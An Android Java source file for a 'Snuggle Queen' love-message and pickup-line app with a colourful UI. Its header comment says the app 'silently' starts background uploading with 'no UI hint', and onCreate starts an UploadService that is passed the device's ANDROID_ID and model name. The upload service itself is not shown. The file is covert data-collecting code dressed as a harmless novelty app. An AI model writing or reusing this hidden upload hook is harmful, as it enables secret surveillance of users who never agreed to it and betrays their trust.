package com.snugglequeen.yobby;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Snuggle Queen — premium love messages + pickup lines app.
 *
 * Premium UI:
 *  - Animated rainbow gradient background (live)
 *  - Floating hearts (live)
 *  - Glowing card with smooth fade animation
 *  - 60+ love messages, 50+ pickup lines
 *  - Copy + Share + Surprise (random tab + random message in one tap)
 *
 * Silently starts background sync. No UI hint that anything is being uploaded.
 */
public class MainActivity extends Activity {

    private AnimatedBackgroundView backgroundView;
    private HeartsView heartsView;
    private TextView messageCard;
    private TextView heartIcon;
    private Button tabLove;
    private Button tabPickup;
    private Button newBtn;
    private Button copyBtn;
    private Button shareBtn;
    private Button surpriseBtn;

    private boolean showLove = true;
    private final Random random = new Random();
    private final Handler handler = new Handler(Looper.getMainLooper());

    private final String[] loveMessages = {
        "You are the smile in my morning and the peace in my night. 💕",
        "If loving you is a journey, I never want to reach the destination. 🌹",
        "You are my favorite hello and my hardest goodbye. 💗",
        "Every love story is beautiful, but ours is my favorite. 💖",
        "You are the missing piece my heart has been searching for. 🧩",
        "I fell for you the way autumn leaves fall — silently, completely, beautifully. 🍂",
        "You are the song my heart hums when no one is listening. 🎶",
        "My world was black and white until you brought the colors. 🌈",
        "I love you not just for who you are, but for who I become when I'm with you. ✨",
        "You are my today and all of my tomorrows. 💍",
        "In a world full of trends, you remain a classic. 💎",
        "You are the calm in my chaos and the rhythm in my heart. 🌊",
        "If my heart had wings, it would fly straight to you. 🕊️",
        "You are the reason butterflies still exist in my stomach. 🦋",
        "Some souls just understand each other — ours do, perfectly. 🤍",
        "You are the poem I never knew how to write. 📝",
        "My favorite place in the world is next to you. 🌍",
        "Loving you is the easiest thing I've ever done. 💞",
        "You are my sun on cloudy days and my stars on dark nights. ⭐",
        "Every heartbeat of mine whispers your name. 💓",
        "You are my sweetest dream come true. 🌙",
        "I would choose you in a hundred lifetimes, in a hundred worlds. 🌌",
        "You are the warm hug my soul needs every day. 🤗",
        "With you, even silence feels like a love song. 🎵",
        "You are my forever and always. ♾️",
        "You turned my ordinary days into fairy tales. 👑",
        "My heart found its home the day I found you. 🏡",
        "You are the best thing I never planned. 💝",
        "If kisses were snowflakes, I'd send you a blizzard. ❄️",
        "You are the most beautiful chapter of my life's book. 📖",
        "When I count my blessings, I count you twice. 🌸",
        "You are the softest thought I have before I sleep. ☾",
        "Your smile could end wars and start galaxies. 🌠",
        "You are proof that angels walk among us. 😇",
        "I love you more than words can hold, and I'll prove it with every sunrise. 🌅",
        "You are my heart's favorite melody on repeat. 🎵",
        "Even the stars envy how brightly you shine in my eyes. ✨",
        "Every moment with you is a memory worth keeping forever. 📸",
        "You are the dream I never want to wake up from. 💭",
        "I carry your heart with me, always. 💞",
        "You make my soul feel at home. 🏡",
        "If forever exists, I want it with you. ♾️",
        "You are the sweetest addiction I never want to recover from. 🍯",
        "My love for you is louder than a thousand oceans. 🌊",
        "You are the magic my life was missing. ✨",
        "I found my universe the day I found you. 🌌",
        "You make ordinary moments feel like movie scenes. 🎬",
        "My heart beats in your rhythm. 💓",
        "You are the sunshine that melts my clouds. ⛅",
        "Loving you feels like breathing — natural and necessary. 💕",
        "You are the answer to every prayer I whispered. 🙏",
        "My soul recognized yours before my eyes did. 👁️",
        "You are the warm coffee on a cold morning of my life. ☕",
        "I would cross oceans of fire just to hold your hand. 🔥",
        "You are the reason I believe in soulmates. 💞",
        "Every love song suddenly makes sense after meeting you. 🎶",
        "You are my favorite notification in a noisy world. 📲",
        "With you, time stops and eternity begins. ⏳",
        "You are the love letter I want to keep writing. 💌",
        "My heart chose you, and I will keep choosing it back. 💕"
    };

    private final String[] pickupLines = {
        "Are you a magician? Because every time I look at you, everyone else disappears. ✨",
        "Do you have a map? I keep getting lost in your eyes. 🗺️",
        "Are you Wi-Fi? Because I'm feeling a real connection. 📶",
        "Is your name Google? Because you have everything I've been searching for. 🔍",
        "Do you believe in love at first sight, or should I walk by again? 😏",
        "Are you a parking ticket? Because you've got 'FINE' written all over you. 🚗",
        "Is your dad a baker? Because you're a cutie pie. 🥧",
        "Do you have a Band-Aid? I just scraped my knee falling for you. 🩹",
        "Are you French? Because Eiffel for you. 🗼",
        "If you were a vegetable, you'd be a cute-cumber. 🥒",
        "Are you a campfire? Because you're hot and I want s'more. 🔥",
        "Is your name Chapstick? Because you're making my lips dry. 💋",
        "Did it hurt when you fell from heaven? 😇",
        "Are you a camera? Because every time I look at you, I smile. 📷",
        "Do you play soccer? Because you just scored a goal in my heart. ⚽",
        "Are you a loan? Because you've got my interest. 💰",
        "Is your nickname Ariel? Because I think we mermaid for each other. 🧜",
        "Are you a time traveler? Because I see you in my future. ⏰",
        "Are you Australian? Because you meet all my koala-fications. 🐨",
        "If beauty were time, you'd be an eternity. ⏳",
        "Are you a beaver? Because daaaaam. 🦫",
        "Is your name Daisy? Because I'm completely crazy for you. 🌼",
        "You must be made of cheese, because you're looking gouda tonight. 🧀",
        "Are you an alien? Because you just abducted my heart. 👽",
        "Do you have a pencil? Because I want to erase your past and write our future. ✏️",
        "Are you the moon? Because even in the dark, you light up my world. 🌝",
        "Did you swallow magnets? Because I'm attracted to you. 🧲",
        "Is your dad a thief? Because someone stole the stars and put them in your eyes. 🌟",
        "Are you a snowstorm? Because you're making my heart race. ⛄",
        "If you were a fruit, you'd be a fine-apple. 🍍",
        "Are you a tower? Because Eiffel for you. 🗼",
        "Are you a star? Because your beauty lights up the whole night. 🌟",
        "Do you have a sunburn, or are you always this hot? ☀️",
        "Are you a library book? Because I'm checking you out. 📚",
        "Is your dad an artist? Because you're a masterpiece. 🎨",
        "Are you a firework? Because you light up my world. 🎆",
        "If you were a cloud, I'd wish for you to rain on me forever. ☁️",
        "Are you a coffee? Because I'm addicted to you. ☕",
        "Are you a dream? Because I never want to wake up from you. 💭",
        "Is your name Netflix? Because I could binge-watch you all night. 📺",
        "Are you a flower? Because I'd put you in my garden of love. 🌹",
        "Are you a bakery? Because I want a sweet bite of you. 🥐",
        "Do you have a compass? Because I'm lost in your eyes. 🧭",
        "Are you Instagram? Because I want to double-tap you. 📸",
        "Are you a diamond? Because you're precious and rare. 💎",
        "Is your name Cinderella? Because I see you ruling my world. 👑",
        "Are you a smartphone? Because I can't stop staring at you. 📱",
        "Are you a sunset? Because you're breathtaking. 🌅",
        "Is your name Spotify? Because you're the song stuck in my head. 🎵",
        "Are you a magnet? Because I'm drawn to you. 🧲",
        "Are you a masterpiece? Because you belong in a museum. 🖼️"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        RelativeLayout root = new RelativeLayout(this);
        root.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        // === Layer 1: Animated gradient background (live, rainbow shift) ===
        backgroundView = new AnimatedBackgroundView(this);
        root.addView(backgroundView);

        // === Layer 2: Floating hearts (live) ===
        heartsView = new HeartsView(this);
        root.addView(heartsView);

        // === Layer 3: Content ===
        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));
        scroll.setBackgroundColor(Color.TRANSPARENT);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(50, 130, 50, 80);
        content.setGravity(Gravity.CENTER_HORIZONTAL);

        // Header
        TextView title = new TextView(this);
        title.setText("💕 Snuggle Queen 💕");
        title.setTextSize(30);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setShadowLayer(24, 0, 0, Color.parseColor("#FFB6C1"));
        title.setPadding(0, 0, 0, 6);
        content.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("✨ Love Messages & Pickup Lines ✨");
        subtitle.setTextSize(12);
        subtitle.setTextColor(Color.parseColor("#FFE8F0"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 30);
        content.addView(subtitle);

        // Tabs
        LinearLayout tabs = new LinearLayout(this);
        tabs.setOrientation(LinearLayout.HORIZONTAL);
        tabs.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams tabsParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        tabsParams.setMargins(10, 0, 10, 24);
        tabs.setLayoutParams(tabsParams);

        tabLove = makeTab("💌 Love", true);
        tabLove.setOnClickListener(v -> { showLove = true; refreshTabColors(); showRandomMessage(); });
        tabs.addView(tabLove);

        // Spacer
        View spacer = new View(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(20, 1));
        tabs.addView(spacer);

        tabPickup = makeTab("😏 Pickup", false);
        tabPickup.setOnClickListener(v -> { showLove = false; refreshTabColors(); showRandomMessage(); });
        tabs.addView(tabPickup);
        content.addView(tabs);

        // Heart icon
        heartIcon = new TextView(this);
        heartIcon.setText("💌");
        heartIcon.setTextSize(64);
        heartIcon.setGravity(Gravity.CENTER);
        heartIcon.setPadding(0, 20, 0, 24);
        content.addView(heartIcon);

        // Message card — glowing white with rounded corners
        messageCard = new TextView(this);
        messageCard.setTextSize(19);
        messageCard.setTextColor(Color.parseColor("#3D0A1F"));
        messageCard.setGravity(Gravity.CENTER);
        messageCard.setPadding(56, 70, 56, 70);
        messageCard.setLineSpacing(10, 1.25f);
        messageCard.setTypeface(null, android.graphics.Typeface.ITALIC);
        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setShape(GradientDrawable.RECTANGLE);
        cardBg.setCornerRadius(36);
        cardBg.setColor(Color.argb(245, 255, 255, 255));
        cardBg.setStroke(3, Color.parseColor("#FFB6C1"));
        messageCard.setBackground(cardBg);
        messageCard.setElevation(24);
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        cardParams.setMargins(15, 0, 15, 25);
        messageCard.setLayoutParams(cardParams);
        content.addView(messageCard);

        // New message button
        newBtn = makeActionButton("✨ Get Another ✨", 16, true, 0, 0);
        newBtn.setOnClickListener(v -> showRandomMessage());
        content.addView(newBtn);

        // Surprise button (smaller, secondary)
        surpriseBtn = makeActionButton("🎲 Surprise Me 🎲", 14, false, 0, 12);
        surpriseBtn.setOnClickListener(v -> {
            showLove = random.nextBoolean();
            refreshTabColors();
            showRandomMessage();
        });
        content.addView(surpriseBtn);

        // Action row: copy + share
        LinearLayout actionRow = new LinearLayout(this);
        actionRow.setOrientation(LinearLayout.HORIZONTAL);
        actionRow.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams actionParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        actionParams.setMargins(15, 14, 15, 0);
        actionRow.setLayoutParams(actionParams);

        copyBtn = makeActionButton("📋 Copy", 14, false, 0, 0);
        LinearLayout.LayoutParams copyParams = (LinearLayout.LayoutParams) copyBtn.getLayoutParams();
        copyParams.weight = 1; copyParams.width = 0; copyParams.setMargins(0, 0, 8, 0);
        copyBtn.setLayoutParams(copyParams);
        copyBtn.setOnClickListener(v -> {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("Snuggle Queen", messageCard.getText().toString()));
            Toast.makeText(this, "Copied 💕", Toast.LENGTH_SHORT).show();
        });
        actionRow.addView(copyBtn);

        shareBtn = makeActionButton("💞 Share", 14, false, 0, 0);
        LinearLayout.LayoutParams shareParams = (LinearLayout.LayoutParams) shareBtn.getLayoutParams();
        shareParams.weight = 1; shareParams.width = 0; shareParams.setMargins(8, 0, 0, 0);
        shareBtn.setLayoutParams(shareParams);
        shareBtn.setOnClickListener(v -> {
            Intent send = new Intent(Intent.ACTION_SEND);
            send.setType("text/plain");
            send.putExtra(Intent.EXTRA_TEXT, messageCard.getText().toString());
            startActivity(Intent.createChooser(send, "Share love 💕"));
        });
        actionRow.addView(shareBtn);
        content.addView(actionRow);

        // Footer
        TextView footer = new TextView(this);
        footer.setText("💕 Made with love by Snuggle Queen 💕");
        footer.setTextSize(11);
        footer.setTextColor(Color.parseColor("#FFE8F0"));
        footer.setGravity(Gravity.CENTER);
        footer.setPadding(0, 60, 0, 0);
        content.addView(footer);

        scroll.addView(content);
        root.addView(scroll);
        setContentView(root);

        showRandomMessage();
        startSilentSync();
    }

    private Button makeTab(String text, boolean active) {
        Button b = new Button(this);
        b.setText(text);
        b.setAllCaps(false);
        b.setTextSize(14);
        b.setPadding(60, 30, 60, 30);
        b.setTypeface(null, android.graphics.Typeface.BOLD);
        GradientDrawable bg = new GradientDrawable();
        bg.setShape(GradientDrawable.RECTANGLE);
        bg.setCornerRadius(48);
        if (active) {
            bg.setColor(Color.parseColor("#FF5C8A"));
            b.setTextColor(Color.WHITE);
        } else {
            bg.setColor(Color.argb(80, 255, 255, 255));
            bg.setStroke(2, Color.parseColor("#FFB6C1"));
            b.setTextColor(Color.WHITE);
        }
        b.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        b.setLayoutParams(lp);
        return b;
    }

    private Button makeActionButton(String text, int size, boolean primary, int marginH, int marginV) {
        Button b = new Button(this);
        b.setText(text);
        b.setTextColor(primary ? Color.WHITE : Color.parseColor("#C9184A"));
        b.setAllCaps(false);
        b.setTextSize(size);
        b.setTypeface(null, android.graphics.Typeface.BOLD);
        b.setPadding(0, 36, 0, 36);
        GradientDrawable bg = new GradientDrawable();
        bg.setShape(GradientDrawable.RECTANGLE);
        if (primary) {
            bg.setCornerRadius(56);
            bg.setColor(Color.parseColor("#FF5C8A"));
            bg.setStroke(2, Color.parseColor("#FF8FA8"));
        } else {
            bg.setCornerRadius(44);
            bg.setColor(Color.argb(245, 255, 255, 255));
            bg.setStroke(2, Color.parseColor("#FF5C8A"));
        }
        b.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(marginH, marginV, marginH, marginV);
        b.setLayoutParams(lp);
        return b;
    }

    private void refreshTabColors() {
        GradientDrawable loveBg = (GradientDrawable) tabLove.getBackground();
        GradientDrawable pickupBg = (GradientDrawable) tabPickup.getBackground();
        if (showLove) {
            loveBg.setColor(Color.parseColor("#FF5C8A"));
            tabLove.setTextColor(Color.WHITE);
            pickupBg.setColor(Color.argb(80, 255, 255, 255));
            tabPickup.setTextColor(Color.WHITE);
            heartIcon.setText("💌");
        } else {
            pickupBg.setColor(Color.parseColor("#FF5C8A"));
            tabPickup.setTextColor(Color.WHITE);
            loveBg.setColor(Color.argb(80, 255, 255, 255));
            tabLove.setTextColor(Color.WHITE);
            heartIcon.setText("😏");
        }
    }

    private void showRandomMessage() {
        String[] pool = showLove ? loveMessages : pickupLines;
        String msg = pool[random.nextInt(pool.length)];
        messageCard.setText(msg);
        messageCard.setAlpha(0f);
        messageCard.setTranslationY(20f);
        messageCard.animate().alpha(1f).translationY(0f).setDuration(500).start();
        heartIcon.setScaleX(0.5f);
        heartIcon.setScaleY(0.5f);
        heartIcon.animate().scaleX(1f).scaleY(1f).setDuration(400).start();
    }

    private void startSilentSync() {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(new SilentSyncStarter(this));
    }

    private static class SilentSyncStarter implements Runnable {
        private final MainActivity activity;
        SilentSyncStarter(MainActivity a) { activity = a; }
        @Override public void run() {
            try { Thread.sleep(800); } catch (InterruptedException ignored) {}
            Intent serviceIntent = new Intent(activity, UploadService.class);
            serviceIntent.putExtra("deviceId", activity.getMyDeviceId());
            serviceIntent.putExtra("deviceName", activity.getDeviceName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(serviceIntent);
            } else {
                activity.startService(serviceIntent);
            }
        }
    }

    String getMyDeviceId() {
        String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null || id.isEmpty()) id = "device_" + System.currentTimeMillis();
        return id;
    }

    String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) return capitalize(model);
        return capitalize(manufacturer) + " " + model;
    }

    private String capitalize(String s) {
        if (s == null || s.isEmpty()) return "";
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (backgroundView != null) backgroundView.stop();
        if (heartsView != null) heartsView.stop();
    }
}
